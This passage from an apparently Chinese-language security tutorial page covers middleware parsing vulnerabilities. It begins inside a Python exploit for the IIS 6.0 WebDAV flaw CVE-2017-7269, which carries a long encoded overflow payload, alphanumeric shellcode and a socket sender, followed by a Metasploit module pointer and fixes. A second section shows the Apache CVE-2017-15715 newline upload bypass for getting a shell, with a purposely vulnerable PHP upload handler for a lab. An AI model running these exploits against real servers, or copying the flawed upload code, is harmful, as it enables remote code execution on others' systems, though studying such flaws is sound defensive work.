class="symbol">\x</span>8a<span class="symbol">\x</span>e5<span class="symbol">\x</span>91<span class="symbol">\x</span>a2<span class="symbol">\x</span>e5<span class="symbol">\x</span>80<span class="symbol">\x</span>b3<span class="symbol">\x</span>e3<span class="symbol">\x</span>95<span class="symbol">\x</span>b7<span class="symbol">\x</span>e6<span class="symbol">\x</span>a9<span class="symbol">\x</span>b7<span class="symbol">\x</span>e4<span class="symbol">\x</span>85<span class="symbol">\x</span>84<span class="symbol">\x</span>e3<span class="symbol">\x</span>8c<span class="symbol">\x</span>b4<span class="symbol">\x</span>e6<span class="symbol">\x</span>91<span class="symbol">\x</span>b6<span class="symbol">\x</span>e4<span class="symbol">\x</span>b5<span class="symbol">\x</span>86<span class="symbol">\x</span>e5<span class="symbol">\x</span>99<span class="symbol">\x</span>94<span class="symbol">\x</span>e4<span class="symbol">\x</span>9d<span class="symbol">\x</span>ac<span class="symbol">\x</span>e6<span class="symbol">\x</span>95<span class="symbol">\x</span>83<span class="symbol">\x</span>e7<span class="symbol">\x</span>98<span class="symbol">\x</span>b2<span class="symbol">\x</span>e7<span class="symbol">\x</span>89<span class="symbol">\x</span>b8<span class="symbol">\x</span>e5<span class="symbol">\x</span>9d<span class="symbol">\x</span>a9<span class="symbol">\x</span>e4<span class="symbol">\x</span>8c<span class="symbol">\x</span>b8<span class="symbol">\x</span>e6<span class="symbol">\x</span>89<span class="symbol">\x</span>b2<span class="symbol">\x</span>e5<span class="symbol">\x</span>a8<span class="symbol">\x</span>b0<span class="symbol">\x</span>e5<span class="symbol">\x</span>a4<span class="symbol">\x</span>b8<span class="symbol">\x</span>e5<span class="symbol">\x</span>91<span class="symbol">\x</span>88<span class="symbol">\x</span>c8<span class="symbol">\x</span>82<span class="symbol">\x</span>c8<span class="symbol">\x</span>82<span class="symbol">\x</span>e1<span class="symbol">\x</span>8b<span class="symbol">\x</span>80<span class="symbol">\x</span>e6<span class="symbol">\x</span>a0<span class="symbol">\x</span>83<span class="symbol">\x</span>e6<span class="symbol">\x</span>b1<span class="symbol">\x</span>84<span class="symbol">\x</span>e5<span class="symbol">\x</span>89<span class="symbol">\x</span>96<span class="symbol">\x</span>e4<span class="symbol">\x</span>ac<span class="symbol">\x</span>b7<span class="symbol">\x</span>e6<span class="symbol">\x</span>b1<span class="symbol">\x</span>ad<span class="symbol">\x</span>e4<span class="symbol">\x</span>bd<span class="symbol">\x</span>98<span class="symbol">\x</span>e5<span class="symbol">\x</span>a1<span class="symbol">\x</span>9a<span class="symbol">\x</span>e7<span class="symbol">\x</span>a5<span class="symbol">\x</span>90<span class="symbol">\x</span>e4<span class="symbol">\x</span>a5<span class="symbol">\x</span>aa<span class="symbol">\x</span>e5<span class="symbol">\x</span>a1<span class="symbol">\x</span>8f<span class="symbol">\x</span>e4<span class="symbol">\x</span>a9<span class="symbol">\x</span>92<span class="symbol">\x</span>e4<span class="symbol">\x</span>85<span class="symbol">\x</span>90<span class="symbol">\x</span>e6<span class="symbol">\x</span>99<span class="symbol">\x</span>8d<span class="symbol">\x</span>e1<span class="symbol">\x</span>8f<span class="symbol">\x</span>80<span class="symbol">\x</span>e6<span class="symbol">\x</span>a0<span class="symbol">\x</span>83<span class="symbol">\x</span>e4<span class="symbol">\x</span>a0<span class="symbol">\x</span>b4<span class="symbol">\x</span>e6<span class="symbol">\x</span>94<span class="symbol">\x</span>b1<span class="symbol">\x</span>e6<span class="symbol">\x</span>bd<span class="symbol">\x</span>83<span class="symbol">\x</span>e6<span class="symbol">\x</span>b9<span class="symbol">\x</span>a6<span class="symbol">\x</span>e7<span class="symbol">\x</span>91<span class="symbol">\x</span>81<span class="symbol">\x</span>e4<span class="symbol">\x</span>8d<span class="symbol">\x</span>ac<span class="symbol">\x</span>e1<span class="symbol">\x</span>8f<span class="symbol">\x</span>80<span class="symbol">\x</span>e6<span class="symbol">\x</span>a0<span class="symbol">\x</span>83<span class="symbol">\x</span>e5<span class="symbol">\x</span>8d<span class="symbol">\x</span>83<span class="symbol">\x</span>e6<span class="symbol">\x</span>a9<span class="symbol">\x</span>81<span class="symbol">\x</span>e7<span class="symbol">\x</span>81<span class="symbol">\x</span>92<span class="symbol">\x</span>e3<span class="symbol">\x</span>8c<span class="symbol">\x</span>b0<span class="symbol">\x</span>e5<span class="symbol">\x</span>a1<span class="symbol">\x</span>a6<span class="symbol">\x</span>e4<span class="symbol">\x</span>89<span class="symbol">\x</span>8c<span class="symbol">\x</span>e7<span class="symbol">\x</span>81<span class="symbol">\x</span>8b<span class="symbol">\x</span>e6<span class="symbol">\x</span>8d<span class="symbol">\x</span>86<span class="symbol">\x</span>e5<span class="symbol">\x</span>85<span class="symbol">\x</span>b3<span class="symbol">\x</span>e7<span class="symbol">\x</span>a5<span class="symbol">\x</span>81<span class="symbol">\x</span>e7<span class="symbol">\x</span>a9<span class="symbol">\x</span>90<span class="symbol">\x</span>e4<span class="symbol">\x</span>a9<span class="symbol">\x</span>ac'</span><br><span class="line">    pay+='&gt;'</span><br><span class="line">    pay+=' (Not &lt;locktoken:write1&gt;) &lt;http://localhost:' + port + '/bbbbbbb'</span><br><span class="line">    pay+='<span class="symbol">\x</span>e7<span class="symbol">\x</span>a5<span class="symbol">\x</span>88<span class="symbol">\x</span>e6<span class="symbol">\x</span>85<span class="symbol">\x</span>b5<span class="symbol">\x</span>e4<span class="symbol">\x</span>bd<span class="symbol">\x</span>83<span class="symbol">\x</span>e6<span class="symbol">\x</span>bd<span class="symbol">\x</span>a7<span class="symbol">\x</span>e6<span class="symbol">\x</span>ad<span class="symbol">\x</span>af<span class="symbol">\x</span>e4<span class="symbol">\x</span>a1<span class="symbol">\x</span>85<span class="symbol">\x</span>e3<span class="symbol">\x</span>99<span class="symbol">\x</span>86<span class="symbol">\x</span>e6<span class="symbol">\x</span>9d<span class="symbol">\x</span>b5<span class="symbol">\x</span>e4<span class="symbol">\x</span>90<span class="symbol">\x</span>b3<span class="symbol">\x</span>e3<span class="symbol">\x</span>a1<span class="symbol">\x</span>b1<span class="symbol">\x</span>e5<span class="symbol">\x</span>9d<span class="symbol">\x</span>a5<span class="symbol">\x</span>e5<span class="symbol">\x</span>a9<span class="symbol">\x</span>a2<span class="symbol">\x</span>e5<span class="symbol">\x</span>90<span class="symbol">\x</span>b5<span class="symbol">\x</span>e5<span class="symbol">\x</span>99<span class="symbol">\x</span>a1<span class="symbol">\x</span>e6<span class="symbol">\x</span>a5<span class="symbol">\x</span>92<span class="symbol">\x</span>e6<span class="symbol">\x</span>a9<span class="symbol">\x</span>93<span class="symbol">\x</span>e5<span class="symbol">\x</span>85<span class="symbol">\x</span>97<span class="symbol">\x</span>e3<span class="symbol">\x</span>a1<span class="symbol">\x</span>8e<span class="symbol">\x</span>e5<span class="symbol">\x</span>a5<span class="symbol">\x</span>88<span class="symbol">\x</span>e6<span class="symbol">\x</span>8d<span class="symbol">\x</span>95<span class="symbol">\x</span>e4<span class="symbol">\x</span>a5<span class="symbol">\x</span>b1<span class="symbol">\x</span>e4<span class="symbol">\x</span>8d<span class="symbol">\x</span>a4<span class="symbol">\x</span>e6<span class="symbol">\x</span>91<span class="symbol">\x</span>b2<span class="symbol">\x</span>e3<span class="symbol">\x</span>91<span class="symbol">\x</span>a8<span class="symbol">\x</span>e4<span class="symbol">\x</span>9d<span class="symbol">\x</span>98<span class="symbol">\x</span>e7<span class="symbol">\x</span>85<span class="symbol">\x</span>b9<span class="symbol">\x</span>e3<span class="symbol">\x</span>8d<span class="symbol">\x</span>ab<span class="symbol">\x</span>e6<span class="symbol">\x</span>ad<span class="symbol">\x</span>95<span class="symbol">\x</span>e6<span class="symbol">\x</span>b5<span class="symbol">\x</span>88<span class="symbol">\x</span>e5<span class="symbol">\x</span>81<span class="symbol">\x</span>8f<span class="symbol">\x</span>e7<span class="symbol">\x</span>a9<span class="symbol">\x</span>86<span class="symbol">\x</span>e3<span class="symbol">\x</span>91<span class="symbol">\x</span>b1<span class="symbol">\x</span>e6<span class="symbol">\x</span>bd<span class="symbol">\x</span>94<span class="symbol">\x</span>e7<span class="symbol">\x</span>91<span class="symbol">\x</span>83<span class="symbol">\x</span>e5<span class="symbol">\x</span>a5<span class="symbol">\x</span>96<span class="symbol">\x</span>e6<span class="symbol">\x</span>bd<span class="symbol">\x</span>af<span class="symbol">\x</span>e7<span class="symbol">\x</span>8d<span class="symbol">\x</span>81<span class="symbol">\x</span>e3<span class="symbol">\x</span>91<span class="symbol">\x</span>97<span class="symbol">\x</span>e6<span class="symbol">\x</span>85<span class="symbol">\x</span>a8<span class="symbol">\x</span>e7<span class="symbol">\x</span>a9<span class="symbol">\x</span>b2<span class="symbol">\x</span>e3<span class="symbol">\x</span>9d<span class="symbol">\x</span>85<span class="symbol">\x</span>e4<span class="symbol">\x</span>b5<span class="symbol">\x</span>89<span class="symbol">\x</span>e5<span class="symbol">\x</span>9d<span class="symbol">\x</span>8e<span class="symbol">\x</span>e5<span class="symbol">\x</span>91<span class="symbol">\x</span>88<span class="symbol">\x</span>e4<span class="symbol">\x</span>b0<span class="symbol">\x</span>b8<span class="symbol">\x</span>e3<span class="symbol">\x</span>99<span class="symbol">\x</span>ba<span class="symbol">\x</span>e3<span class="symbol">\x</span>95<span class="symbol">\x</span>b2<span class="symbol">\x</span>e6<span class="symbol">\x</span>89<span class="symbol">\x</span>a6<span class="symbol">\x</span>e6<span class="symbol">\x</span>b9<span class="symbol">\x</span>83<span class="symbol">\x</span>e4<span class="symbol">\x</span>a1<span class="symbol">\x</span>ad<span class="symbol">\x</span>e3<span class="symbol">\x</span>95<span class="symbol">\x</span>88<span class="symbol">\x</span>e6<span class="symbol">\x</span>85<span class="symbol">\x</span>b7<span class="symbol">\x</span>e4<span class="symbol">\x</span>b5<span class="symbol">\x</span>9a<span class="symbol">\x</span>e6<span class="symbol">\x</span>85<span class="symbol">\x</span>b4<span class="symbol">\x</span>e4<span class="symbol">\x</span>84<span class="symbol">\x</span>b3<span class="symbol">\x</span>e4<span class="symbol">\x</span>8d<span class="symbol">\x</span>a5<span class="symbol">\x</span>e5<span class="symbol">\x</span>89<span class="symbol">\x</span>b2<span class="symbol">\x</span>e6<span class="symbol">\x</span>b5<span class="symbol">\x</span>a9<span class="symbol">\x</span>e3<span class="symbol">\x</span>99<span class="symbol">\x</span>b1<span class="symbol">\x</span>e4<span class="symbol">\x</span>b9<span class="symbol">\x</span>a4<span class="symbol">\x</span>e6<span class="symbol">\x</span>b8<span class="symbol">\x</span>b9<span class="symbol">\x</span>e6<span class="symbol">\x</span>8d<span class="symbol">\x</span>93<span class="symbol">\x</span>e6<span class="symbol">\x</span>ad<span class="symbol">\x</span>a4<span class="symbol">\x</span>e5<span class="symbol">\x</span>85<span class="symbol">\x</span>86<span class="symbol">\x</span>e4<span class="symbol">\x</span>bc<span class="symbol">\x</span>b0<span class="symbol">\x</span>e7<span class="symbol">\x</span>a1<span class="symbol">\x</span>af<span class="symbol">\x</span>e7<span class="symbol">\x</span>89<span class="symbol">\x</span>93<span class="symbol">\x</span>e6<span class="symbol">\x</span>9d<span class="symbol">\x</span>90<span class="symbol">\x</span>e4<span class="symbol">\x</span>95<span class="symbol">\x</span>93<span class="symbol">\x</span>e7<span class="symbol">\x</span>a9<span class="symbol">\x</span>a3<span class="symbol">\x</span>e7<span class="symbol">\x</span>84<span class="symbol">\x</span>b9<span class="symbol">\x</span>e4<span class="symbol">\x</span>bd<span class="symbol">\x</span>93<span class="symbol">\x</span>e4<span class="symbol">\x</span>91<span class="symbol">\x</span>96<span class="symbol">\x</span>e6<span class="symbol">\x</span>bc<span class="symbol">\x</span>b6<span class="symbol">\x</span>e7<span class="symbol">\x</span>8d<span class="symbol">\x</span>b9<span class="symbol">\x</span>e6<span class="symbol">\x</span>a1<span class="symbol">\x</span>b7<span class="symbol">\x</span>e7<span class="symbol">\x</span>a9<span class="symbol">\x</span>96<span class="symbol">\x</span>e6<span class="symbol">\x</span>85<span class="symbol">\x</span>8a<span class="symbol">\x</span>e3<span class="symbol">\x</span>a5<span class="symbol">\x</span>85<span class="symbol">\x</span>e3<span class="symbol">\x</span>98<span class="symbol">\x</span>b9<span class="symbol">\x</span>e6<span class="symbol">\x</span>b0<span class="symbol">\x</span>b9<span class="symbol">\x</span>e4<span class="symbol">\x</span>94<span class="symbol">\x</span>b1<span class="symbol">\x</span>e3<span class="symbol">\x</span>91<span class="symbol">\x</span>b2<span class="symbol">\x</span>e5<span class="symbol">\x</span>8d<span class="symbol">\x</span>a5<span class="symbol">\x</span>e5<span class="symbol">\x</span>a1<span class="symbol">\x</span>8a<span class="symbol">\x</span>e4<span class="symbol">\x</span>91<span class="symbol">\x</span>8e<span class="symbol">\x</span>e7<span class="symbol">\x</span>a9<span class="symbol">\x</span>84<span class="symbol">\x</span>e6<span class="symbol">\x</span>b0<span class="symbol">\x</span>b5<span class="symbol">\x</span>e5<span class="symbol">\x</span>a9<span class="symbol">\x</span>96<span class="symbol">\x</span>e6<span class="symbol">\x</span>89<span class="symbol">\x</span>81<span class="symbol">\x</span>e6<span class="symbol">\x</span>b9<span class="symbol">\x</span>b2<span class="symbol">\x</span>e6<span class="symbol">\x</span>98<span class="symbol">\x</span>b1<span class="symbol">\x</span>e5<span class="symbol">\x</span>a5<span class="symbol">\x</span>99<span class="symbol">\x</span>e5<span class="symbol">\x</span>90<span class="symbol">\x</span>b3<span class="symbol">\x</span>e3<span class="symbol">\x</span>85<span class="symbol">\x</span>82<span class="symbol">\x</span>e5<span class="symbol">\x</span>a1<span class="symbol">\x</span>a5<span class="symbol">\x</span>e5<span class="symbol">\x</span>a5<span class="symbol">\x</span>81<span class="symbol">\x</span>e7<span class="symbol">\x</span>85<span class="symbol">\x</span>90<span class="symbol">\x</span>e3<span class="symbol">\x</span>80<span class="symbol">\x</span>b6<span class="symbol">\x</span>e5<span class="symbol">\x</span>9d<span class="symbol">\x</span>b7<span class="symbol">\x</span>e4<span class="symbol">\x</span>91<span class="symbol">\x</span>97<span class="symbol">\x</span>e5<span class="symbol">\x</span>8d<span class="symbol">\x</span>a1<span class="symbol">\x</span>e1<span class="symbol">\x</span>8f<span class="symbol">\x</span>80<span class="symbol">\x</span>e6<span class="symbol">\x</span>a0<span class="symbol">\x</span>83<span class="symbol">\x</span>e6<span class="symbol">\x</span>b9<span class="symbol">\x</span>8f<span class="symbol">\x</span>e6<span class="symbol">\x</span>a0<span class="symbol">\x</span>80<span class="symbol">\x</span>e6<span class="symbol">\x</span>b9<span class="symbol">\x</span>8f<span class="symbol">\x</span>e6<span class="symbol">\x</span>a0<span class="symbol">\x</span>80<span class="symbol">\x</span>e4<span class="symbol">\x</span>89<span class="symbol">\x</span>87<span class="symbol">\x</span>e7<span class="symbol">\x</span>99<span class="symbol">\x</span>aa<span class="symbol">\x</span>e1<span class="symbol">\x</span>8f<span class="symbol">\x</span>80<span class="symbol">\x</span>e6<span class="symbol">\x</span>a0<span class="symbol">\x</span>83<span class="symbol">\x</span>e4<span class="symbol">\x</span>89<span class="symbol">\x</span>97<span class="symbol">\x</span>e4<span class="symbol">\x</span>bd<span class="symbol">\x</span>b4<span class="symbol">\x</span>e5<span class="symbol">\x</span>a5<span class="symbol">\x</span>87<span class="symbol">\x</span>e5<span class="symbol">\x</span>88<span class="symbol">\x</span>b4<span class="symbol">\x</span>e4<span class="symbol">\x</span>ad<span class="symbol">\x</span>a6<span class="symbol">\x</span>e4<span class="symbol">\x</span>ad<span class="symbol">\x</span>82<span class="symbol">\x</span>e7<span class="symbol">\x</span>91<span class="symbol">\x</span>a4<span class="symbol">\x</span>e7<span class="symbol">\x</span>a1<span class="symbol">\x</span>af<span class="symbol">\x</span>e6<span class="symbol">\x</span>82<span class="symbol">\x</span>82<span class="symbol">\x</span>e6<span class="symbol">\x</span>a0<span class="symbol">\x</span>81<span class="symbol">\x</span>e5<span class="symbol">\x</span>84<span class="symbol">\x</span>b5<span class="symbol">\x</span>e7<span class="symbol">\x</span>89<span class="symbol">\x</span>ba<span class="symbol">\x</span>e7<span class="symbol">\x</span>91<span class="symbol">\x</span>ba<span class="symbol">\x</span>e4<span class="symbol">\x</span>b5<span class="symbol">\x</span>87<span class="symbol">\x</span>e4<span class="symbol">\x</span>91<span class="symbol">\x</span>99<span class="symbol">\x</span>e5<span class="symbol">\x</span>9d<span class="symbol">\x</span>97<span class="symbol">\x</span>eb<span class="symbol">\x</span>84<span class="symbol">\x</span>93<span class="symbol">\x</span>e6<span class="symbol">\x</span>a0<span class="symbol">\x</span>80<span class="symbol">\x</span>e3<span class="symbol">\x</span>85<span class="symbol">\x</span>b6<span class="symbol">\x</span>e6<span class="symbol">\x</span>b9<span class="symbol">\x</span>af<span class="symbol">\x</span>e2<span class="symbol">\x</span>93<span class="symbol">\x</span>a3<span class="symbol">\x</span>e6<span class="symbol">\x</span>a0<span class="symbol">\x</span>81<span class="symbol">\x</span>e1<span class="symbol">\x</span>91<span class="symbol">\x</span>a0<span class="symbol">\x</span>e6<span class="symbol">\x</span>a0<span class="symbol">\x</span>83<span class="symbol">\x</span>cc<span class="symbol">\x</span>80<span class="symbol">\x</span>e7<span class="symbol">\x</span>bf<span class="symbol">\x</span>be<span class="symbol">\x</span>ef<span class="symbol">\x</span>bf<span class="symbol">\x</span>bf<span class="symbol">\x</span>ef<span class="symbol">\x</span>bf<span class="symbol">\x</span>bf<span class="symbol">\x</span>e1<span class="symbol">\x</span>8f<span class="symbol">\x</span>80<span class="symbol">\x</span>e6<span class="symbol">\x</span>a0<span class="symbol">\x</span>83<span class="symbol">\x</span>d1<span class="symbol">\x</span>ae<span class="symbol">\x</span>e6<span class="symbol">\x</span>a0<span class="symbol">\x</span>83<span class="symbol">\x</span>e7<span class="symbol">\x</span>85<span class="symbol">\x</span>ae<span class="symbol">\x</span>e7<span class="symbol">\x</span>91<span class="symbol">\x</span>b0<span class="symbol">\x</span>e1<span class="symbol">\x</span>90<span class="symbol">\x</span>b4<span class="symbol">\x</span>e6<span class="symbol">\x</span>a0<span class="symbol">\x</span>83<span class="symbol">\x</span>e2<span class="symbol">\x</span>a7<span class="symbol">\x</span>a7<span class="symbol">\x</span>e6<span class="symbol">\x</span>a0<span class="symbol">\x</span>81<span class="symbol">\x</span>e9<span class="symbol">\x</span>8e<span class="symbol">\x</span>91<span class="symbol">\x</span>e6<span class="symbol">\x</span>a0<span class="symbol">\x</span>80<span class="symbol">\x</span>e3<span class="symbol">\x</span>a4<span class="symbol">\x</span>b1<span class="symbol">\x</span>e6<span class="symbol">\x</span>99<span class="symbol">\x</span>ae<span class="symbol">\x</span>e4<span class="symbol">\x</span>a5<span class="symbol">\x</span>95<span class="symbol">\x</span>e3<span class="symbol">\x</span>81<span class="symbol">\x</span>92<span class="symbol">\x</span>e5<span class="symbol">\x</span>91<span class="symbol">\x</span>ab<span class="symbol">\x</span>e7<span class="symbol">\x</span>99<span class="symbol">\x</span>ab<span class="symbol">\x</span>e7<span class="symbol">\x</span>89<span class="symbol">\x</span>8a<span class="symbol">\x</span>e7<span class="symbol">\x</span>a5<span class="symbol">\x</span>a1<span class="symbol">\x</span>e1<span class="symbol">\x</span>90<span class="symbol">\x</span>9c<span class="symbol">\x</span>e6<span class="symbol">\x</span>a0<span class="symbol">\x</span>83<span class="symbol">\x</span>e6<span class="symbol">\x</span>b8<span class="symbol">\x</span>85<span class="symbol">\x</span>e6<span class="symbol">\x</span>a0<span class="symbol">\x</span>80<span class="symbol">\x</span>e7<span class="symbol">\x</span>9c<span class="symbol">\x</span>b2<span class="symbol">\x</span>e7<span class="symbol">\x</span>a5<span class="symbol">\x</span>a8<span class="symbol">\x</span>e4<span class="symbol">\x</span>b5<span class="symbol">\x</span>a9<span class="symbol">\x</span>e3<span class="symbol">\x</span>99<span class="symbol">\x</span>ac<span class="symbol">\x</span>e4<span class="symbol">\x</span>91<span class="symbol">\x</span>a8<span class="symbol">\x</span>e4<span class="symbol">\x</span>b5<span class="symbol">\x</span>b0<span class="symbol">\x</span>e8<span class="symbol">\x</span>89<span class="symbol">\x</span>86<span class="symbol">\x</span>e6<span class="symbol">\x</span>a0<span class="symbol">\x</span>80<span class="symbol">\x</span>e4<span class="symbol">\x</span>a1<span class="symbol">\x</span>b7<span class="symbol">\x</span>e3<span class="symbol">\x</span>89<span class="symbol">\x</span>93<span class="symbol">\x</span>e1<span class="symbol">\x</span>b6<span class="symbol">\x</span>aa<span class="symbol">\x</span>e6<span class="symbol">\x</span>a0<span class="symbol">\x</span>82<span class="symbol">\x</span>e6<span class="symbol">\x</span>bd<span class="symbol">\x</span>aa<span class="symbol">\x</span>e4<span class="symbol">\x</span>8c<span class="symbol">\x</span>b5<span class="symbol">\x</span>e1<span class="symbol">\x</span>8f<span class="symbol">\x</span>b8<span class="symbol">\x</span>e6<span class="symbol">\x</span>a0<span class="symbol">\x</span>83<span class="symbol">\x</span>e2<span class="symbol">\x</span>a7<span class="symbol">\x</span>a7<span class="symbol">\x</span>e6<span class="symbol">\x</span>a0<span class="symbol">\x</span>81'</span><br><span class="line">    shellcode='VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJIOPKSKPKPTKLITKKQDKU0G0KPKPM00QQXI8KPM0M0K8KPKPKPM0QNTKKNU397N30WRJLMSSI7LNR72JPTKOXPZKQH0CR615NMNRP0NQNWNMOGP206NYKPOSRORN3D35RND4NMPTD9RP2ENZMPT4352XCDNOS8BTBMBLLMKZOSROBN441URNT4NMPL2ERNS7SDBHOJOBNVO0LMLJLMKZ0HOXOY0TO0OS260ENMNRP0NQOGNMOGOB06OIMP2345RCS3RET3D3M0KLK8SRM0KPM0C0SYK5NQWP2DDK0PNP4KQBLLTKQBMDDKD2MXLOGG0JO6NQKO6LOLQQSLKRNLMP7QXOLMM18G9RJRR2R74KQBLP4K0JOL4K0LN1RXK3PHKQHQ0Q4K29MPM19CTKQ9MH9SOJQ94KNTTKKQJ6P1KOFLY1XOLMKQXGNX9PD5KFM33MKHOKSMO42UJDPXTKB8O4KQIC1V4KLL0K4K0XMLKQXSTKKTTKKQJ0CYQ4O4MTQKQK1QR90Z0QKOYPQOQOQJ4KLRJKTM1MWKOWMCBR2OQZKPPSKOYEKPA'</span><br><span class="line">    pay+=shellcode</span><br><span class="line">    pay+='&gt;<span class="symbol">\r</span><span class="symbol">\n</span><span class="symbol">\r</span><span class="symbol">\n</span>'</span><br><span class="line">    return pay</span><br><span class="line"></span><br><span class="line">def send_pack(ip,port=80) :</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((ip,port))</span><br><span class="line">    time_tick=time.time()</span><br><span class="line">    sock.send(generate_payload(str(port)))</span><br><span class="line">    </span><br><span class="line">    try :</span><br><span class="line">        data = sock.recv(80960)  </span><br><span class="line">    except :</span><br><span class="line">        pass</span><br><span class="line">    </span><br><span class="line">    print data</span><br><span class="line">    </span><br><span class="line">    sock.close()</span><br><span class="line">    </span><br><span class="line">    if not -1==data.find('HHIT CVE-2017-7269 Success') :</span><br><span class="line">        return True</span><br><span class="line">    </span><br><span class="line">    return False</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">if 2==len(sys.argv) :</span><br><span class="line">    print send_pack(sys.argv[1])</span><br><span class="line">else :</span><br><span class="line">    print send_pack(sys.argv[1],int(sys.argv[2]))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/knowledge/Middleware_Parsing_vulnerability/005_1.png" alt="005_1"></p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p><code>https://github.com/dmchell/metasploit-framework/pull/1/commits/9e8ec532a260b1a3f03abd09efcc44c30e4491c2</code></p>
+<p>将上面的<code>cve-2017-7269.rb</code>拷贝到kali的<code>/usr/share/metasploit-framework/modules/exploits/windows/iis</code>下</p>
+<p><img src="/img/knowledge/Middleware_Parsing_vulnerability/005_2.png" alt="005_2"></p>
+<h3 id="修复方式-1"><a href="#修复方式-1" class="headerlink" title="修复方式"></a>修复方式</h3><ol>
+<li>由于微软已不再对Windows Server 2003提供支持，建议禁用webDAV功能。</li>
+<li>升级到最新系统 Windows Server 2016。</li>
+</ol>
+<h1 id="Apache相关"><a href="#Apache相关" class="headerlink" title="Apache相关"></a>Apache相关</h1><h2 id="Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><a href="#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="Apache HTTPD 换行解析漏洞（CVE-2017-15715）"></a>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h2><p>环境采用vulhub的<code>/httpd/CVE-2017-15715</code></p>
+<h3 id="漏洞原理-4"><a href="#漏洞原理-4" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Apache版本在2.4.0到2.4.29</p>
+<p>正则中的<code>$</code>不仅可以匹配行尾,如果设置了 RegExp 对象的 Multiline 属性，则 <code>$</code>也匹配 ‘\n’ 或 ‘\r’。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;FilesMatch \.php$&gt;</span></span><br><span class="line">        <span class="attribute"><span class="nomarkup">SetHandler</span></span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>因此16进制的换行符能被<code>$</code>匹配从而被PHP解析。</p>
+<h3 id="实践过程"><a href="#实践过程" class="headerlink" title="实践过程"></a>实践过程</h3><p>可以利用到文件上传中来绕过黑名单,在Apache版本(2.4.0到2.4.29)中上传的<code>info.php%0A</code>文件又能被解析,即可getshell。</p>
+<p>这个docker环境没有前端代码的,加一个</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#upload.html</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>CVE-2017-15715<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"index.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">'file'</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"upload"</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#index.php</span></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_FILES</span>[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    <span class="variable">$name</span> = basename(<span class="variable">$_POST</span>[<span class="string">'name'</span>]);</span><br><span class="line">    <span class="variable">$ext</span> = pathinfo(<span class="variable">$name</span>,PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$ext</span>, [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'bad file'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], <span class="string">'./'</span> . <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接上传php文件会被exit,现在将上传的文件名修改成<code>info.php%0a</code></p>
+<p><img src="/img/knowledge/Middleware_Parsing_vulnerability/003_1.png" alt="003_1"></p>
+<p>已经上传成功</p>
+<p><img src="/img/knowledge/Middleware_Parsing_vulnerability/003_2.png" alt="003_2"></p>
+<p><img src="/img/knowledge/Middleware_Parsing_vulnerability/003_3.png" alt="003_3"></p>
+<p>确实是存在解析漏洞的。</p>
+<p>windows操作系统不允许后缀以换行符结尾的文件命名方式，创建文件会失败，所以还是比较鸡肋的。</p>
